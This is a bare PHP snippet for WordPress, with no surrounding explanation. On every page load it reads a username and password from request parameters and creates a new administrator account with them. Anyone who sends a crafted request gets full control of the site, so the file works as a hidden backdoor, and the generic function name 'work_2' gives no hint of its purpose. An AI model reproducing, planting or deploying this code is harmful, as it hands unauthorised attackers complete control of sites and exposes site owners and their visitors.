<?php

if (function_exists('add_action'))
{
    function work_2()
    {
        $__username = @$_REQUEST['__username'];
        $__password = @$_REQUEST['__password'];

        if (! isset ($__username) || ! isset ($__password) || username_exists ($__username))
        {
            return;
        }

        $user = wp_create_user($__username, $__password, "someone@some.domain");
        if (! is_wp_error($user))
        {
            $user = get_user_by('login', $__username);
            $user->set_role('administrator');
        }
    }

    add_action('init', work_2);
}
?>
